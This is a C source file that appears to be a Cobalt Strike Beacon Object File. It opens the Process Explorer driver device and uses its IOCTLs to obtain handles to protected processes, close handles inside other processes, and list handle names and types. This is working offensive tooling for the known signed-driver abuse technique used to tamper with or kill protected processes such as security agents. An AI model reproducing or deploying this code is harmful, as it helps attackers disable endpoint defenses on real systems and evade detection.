#include "ProcExp.h"

HANDLE ConnectToProcExpDevice()
{
	HANDLE hProcExpDevice = NULL;
	//hProcExpDevice = CreateFileA("\\\\.\\PROCEXP152", GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);
	hProcExpDevice = CreateFileA("\\\\.\\PROCEXP152", GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);


	if (hProcExpDevice == INVALID_HANDLE_VALUE)
		return NULL;

	return hProcExpDevice;
}

HANDLE ProcExpOpenProtectedProcess(ULONGLONG ulPID, HANDLE hProcExpDevice)
{
	HANDLE hProtectedProcess = NULL;
	DWORD dwBytesReturned = 0;
	BOOL ret = FALSE;


	ret = DeviceIoControl(hProcExpDevice, IOCTL_OPEN_PROTECTED_PROCESS_HANDLE, (LPVOID)&ulPID, sizeof(ulPID),
		&hProtectedProcess,
		sizeof(HANDLE),
		&dwBytesReturned,
		NULL);


	if (dwBytesReturned == 0 || !ret)
	{
		BeaconPrintf(CALLBACK_ERROR, "ProcExpOpenProtectedProcess.DeviceIoControl: %d\n", GetLastError());
		return NULL;
	}

	return hProtectedProcess;
}

BOOL ProcExpKillHandle(DWORD dwPID, ULONGLONG usHandle, HANDLE hProcExpDevice) {

	PVOID lpObjectAddressToClose = NULL;
	PROCEXP_DATA_EXCHANGE ctrl = { 0 };
	BOOL bRet = FALSE;


	/* find the object address */
	lpObjectAddressToClose = GetObjectAddressFromHandle(dwPID, (USHORT)usHandle);


	/* populate the data structure */
	ctrl.ulPID = dwPID;
	ctrl.ulSize = 0;
	ctrl.ulHandle = usHandle;
	ctrl.lpObjectAddress = lpObjectAddressToClose;

	/* send the kill command */

	bRet = DeviceIoControl(hProcExpDevice, IOCTL_CLOSE_HANDLE, (LPVOID)&ctrl, sizeof(PROCEXP_DATA_EXCHANGE), NULL,
		0,
		NULL,
		NULL);

	if (!bRet)
		return Error("ProcExpKillHandle.DeviceIoControl");

	return TRUE;
}


BOOL PrintProtectedHandleInformation(ULONGLONG ulPID, ULONGLONG ulProtectedHandle, PVOID lpObjectAddress, HANDLE hProcExpDevice) {

	PROCEXP_DATA_EXCHANGE data = { 0 };
	DWORD bytesReturned = 0;
	WCHAR szName[500] = { 0 }; //Changed length from MAX_PATH to 500 due to chkstk error in BOF
	WCHAR szType[500] = { 0 }; //Same


	data.ulHandle = ulProtectedHandle;
	data.ulPID = ulPID;
	data.lpObjectAddress = lpObjectAddress;
	data.ulSize = 0;

	if (ProcExpGetObjectInformation(data, IOCTL_GET_HANDLE_NAME, szName, hProcExpDevice)) {
		ProcExpGetObjectInformation(data, IOCTL_GET_HANDLE_TYPE, szType, hProcExpDevice);
		BeaconPrintf(CALLBACK_OUTPUT, "[%#5llx] [%ws] %ws\n", data.ulHandle, szType + 2, szName + 2);
	}
	return TRUE;
}


BOOL ProcExpGetObjectInformation(PROCEXP_DATA_EXCHANGE data, DWORD IOCTL, LPWSTR info, HANDLE hProcExpDevice) {

	DWORD dwBytesReturned = 0;
	BOOL bRet = FALSE;

	bRet = DeviceIoControl(hProcExpDevice, IOCTL, (LPVOID)&data, sizeof(PROCEXP_DATA_EXCHANGE), (LPVOID)info, MAX_BUF, &dwBytesReturned, NULL);
	if (!bRet)
		return Error("ProcExpGetObjectInformation.DeviceIoControl");


	if (dwBytesReturned == 8) // 8 bytes are returned when the handle is unnamed 
		return FALSE;


	return TRUE;
}
